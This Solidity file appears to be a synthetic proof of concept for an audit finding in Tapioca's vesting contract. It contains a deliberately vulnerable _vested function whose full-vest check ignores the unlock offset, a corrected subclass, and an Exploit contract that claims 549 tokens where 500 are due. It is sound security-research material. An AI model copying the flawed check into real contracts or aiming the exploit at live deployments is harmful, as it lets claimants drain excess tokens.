// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tapioca Vesting._vested — the full-vest check ignores the initial unlock
    offset (Code4rena 2024-02, H-05). SYNTHETIC, cheatcode-free.

    Report numbers: total 500, duration 1000, offset 100, start 1000,
    timestamp 1999. The buggy product is 549. The corrected check returns 500.
    The block timestamp is set once, outside run(). */

contract MockTAP {
    string public name = "TAP";
    string public symbol = "TAP";
    uint8 public decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vesting {
    MockTAP public token;
    uint256 public totalAmount;
    uint256 public start;
    uint256 public duration;
    uint256 public cliff;
    uint256 public __initialUnlockTimeOffset;

    constructor(address _token) {
        token = MockTAP(_token);
        totalAmount = 500;
        start = 1000;
        duration = 1000;
        cliff = 0;
        __initialUnlockTimeOffset = 100;
    }

    function claim() external returns (uint256 amount) {
        amount = _vested(totalAmount);
        token.transfer(msg.sender, amount);
    }

    /// Corrected cap. Same inputs, so the test can show both numbers.
    function fairAmount() public view returns (uint256) {
        uint256 _start = start;
        uint256 _duration = duration;
        if (cliff > 0) {
            _start = _start + cliff;
            if (block.timestamp < _start) return 0;
        }
        if (block.timestamp >= _start - __initialUnlockTimeOffset + _duration) return totalAmount;
        _start = _start - __initialUnlockTimeOffset;
        return (totalAmount * (block.timestamp - _start)) / _duration;
    }

    function _vested(uint256 _totalAmount) internal view virtual returns (uint256) {
        uint256 _cliff = cliff;
        uint256 _start = start;
        uint256 _duration = duration;

        if (_start == 0) return 0;

        if (_cliff > 0) {
            _start = _start + _cliff;
            if (block.timestamp < _start) return 0;
        }

        // @> VULN: fully-vested check ignores __initialUnlockTimeOffset, so the product can exceed _totalAmount
        if (block.timestamp >= _start + _duration) return _totalAmount;

        _start = _start - __initialUnlockTimeOffset;
        return (_totalAmount * (block.timestamp - _start)) / _duration;
    }
}

contract VestingFixed is Vesting {
    constructor(address _token) Vesting(_token) {}

    function _vested(uint256 _totalAmount) internal view override returns (uint256) {
        uint256 _cliff = cliff;
        uint256 _start = start;
        uint256 _duration = duration;

        if (_start == 0) return 0;

        if (_cliff > 0) {
            _start = _start + _cliff;
            if (block.timestamp < _start) return 0;
        }

        // FIX: include the initial unlock offset in the full-vest bound.
        if (block.timestamp >= _start - __initialUnlockTimeOffset + _duration) return _totalAmount;

        _start = _start - __initialUnlockTimeOffset;
        return (_totalAmount * (block.timestamp - _start)) / _duration;
    }
}

contract Exploit {
    uint256 public constant CLAIMED = 549;
    uint256 public constant FAIR = 500;

    MockTAP public tap; // nonce 1
    Vesting public vesting; // nonce 2

    uint256 public claimed;
    uint256 public fair;

    constructor() {
        tap = new MockTAP();
        vesting = new Vesting(address(tap));
    }

    function run() external {
        tap.mint(address(vesting), CLAIMED);
        claimed = vesting.claim();
        fair = vesting.fairAmount();
        require(claimed == CLAIMED, "claimed");
        require(fair == FAIR, "fair");
        require(claimed > fair, "no overpay");
        require(tap.balanceOf(address(this)) == CLAIMED, "not paid");
    }
}
